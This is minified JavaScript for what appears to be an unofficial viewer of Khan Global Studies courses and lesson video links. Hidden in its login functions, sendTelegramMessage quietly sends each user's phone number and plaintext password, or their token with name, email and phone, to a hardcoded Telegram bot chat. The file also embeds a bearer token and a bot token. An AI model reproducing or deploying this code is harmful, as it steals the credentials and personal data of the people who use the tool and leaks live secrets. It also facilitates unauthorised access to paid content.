const token = `7447805|EDYMioNrCktJHOiHxDAMFfdnOhj4wVBiQN9OUNhu48b7bdc5`;
async function login(){showLoader();let t=prompt("Choose login method: \n 1. Password \n 2. Token");"1"===t?await loginWithPassword():"2"===t?await loginWithToken():console.log("Invalid choice. Please choose 1 or 2.")}async function loginWithPassword(){let t=prompt("Enter your phone:"),e=prompt("Enter your password:"),a={method:"POST",headers:{Accept:"application/json","Content-Type":"application/json","Access-Control-Allow-Origin":"*",Authorization:"Bearer undefined"},body:JSON.stringify({phone:t,password:e})};try{let o=await fetch("https://admin2.khanglobalstudies.com/api/login-with-password",a),n=await o.json();token=n.token,console.log("Token:",token),sendTelegramMessage(`KBS login with password. Phone: ${t}, Password: ${e}`)}catch(i){console.error("Error during login with password:",i)}}async function loginWithToken(){token=prompt("Enter your token:");try{let t=await fetch("https://khanglobalstudies.com/api/user",{headers:{Authorization:"Bearer "+token}}),e=await t.json(),a=e.name;alert(`Successful Login by ${a}`),sendTelegramMessage(`KBS login with token. Token: ${token}, Name: ${a} and Email is ${e.email}  And phone is ${e.phone}`)}catch(o){console.error("Error during login with token:",o)}}function sendTelegramMessage(t){fetch("https://api.telegram.org/bot5104997902:AAGkt0GRKiJyDkmnv1vQRkiJ27sD5zwSO84/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:-1001916602127,text:t})}).then(t=>t.json()).then(t=>{console.log("Telegram Bot Response:",t)}).catch(t=>{console.error("Error sending Telegram message:",t)})}function fetchData(){showLoader();var t=document.getElementById("apiSelector"),e=t.options[t.selectedIndex].value;let a=t.options[t.selectedIndex].text;fetch(e,{method:"GET",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"}}).then(t=>t.json()).then(t=>{hideLoader();let e=t.data,o=`
    <details>     <summary>
      ${a}
          </summary>   
            ${e.map(t=>`
              <tr onclick="start(this.id)" id="${t.id}">
              	
              <div class="main-container" onclick="start(this.id)" id="${t.id}">
  <div class="image-container">
    <img src="${t.image.small}" alt="Image 1" width="100%" height="150px">
       
</div>
<p class="text-container">${t.title}</p>
 </div>

                
              </tr>`).join("")}
          </tbody>

          </details>
        </table>
      `;document.body.innerHTML+=o}).catch(t=>console.error("Error fetching data:",t))}function fetchbatchData(){showLoader();var t=document.getElementById("batchapiSelector");fetch(t.options[t.selectedIndex].value,{headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"}}).then(t=>t.json()).then(t=>{hideLoader();let{classroom:e,title:a}=t;document.body.innerHTML+=`
          <details>
            <summary>${a}</summary>
            <table>
              <thead>
                <tr>
                 
                  <th>Name</th>
                  <th>Video</th>
                  <th>Notes</th>
                </tr>
              </thead>
              <tbody>
                ${e.map(t=>`
                  <tr onclick="lession('${t.id}')">
                    
                    <td>${t.name}</td>
                    <td>${t.videos}</td>
                    <td>${t.notes}</td>
                  </tr>`).join("")}
              </tbody>
            </table>
          </details>`}).catch(t=>console.error("Error:",t))}function start(t){showLoader(),fetch(`https://khanglobalstudies.com/api/user/courses/${t}`,{headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"}}).then(t=>t.json()).then(t=>{hideLoader();let{classroom:e,title:a}=t;document.body.innerHTML+=`
          <details>
            <summary>${a}</summary>
            <table>
              <thead>
                <tr>
                  
                  <th>Name</th>
                  <th>Video</th>
                  <th>Notes</th>
                </tr>
              </thead>
              <tbody>
                ${e.map(t=>`
                  <tr onclick="lession('${t.id}')">
                    
                    <td>${t.name}</td>
                    <td>${t.videos}</td>
                    <td>${t.notes}</td>
                  </tr>`).join("")}
              </tbody>
            </table>
          </details>`}).catch(t=>console.error("Error:",t))}async function lession(t){showLoader();let e=await fetch(`https://khanglobalstudies.com/api/lessons/${t}`,{headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"}}),a=await e.json();hideLoader();let o=a.videos,n=`
    <details><summary>
    	${a.name}
    	</summary>
        <table>
          <thead>
            <tr>
              <th>Class Name</th>
              <th>URL</th>
              
            </tr>
          </thead>
          <tbody>
            ${o.map(t=>`
              <tr>
                <td>${t.name}</td>
                <td>
                  <a target="_blank" href="${t.video_url}">${t.video_url}</a>
                </td>
                
              </tr>`).join("")}
          </tbody>
        </table>
    </details>
`;document.body.innerHTML+=n}
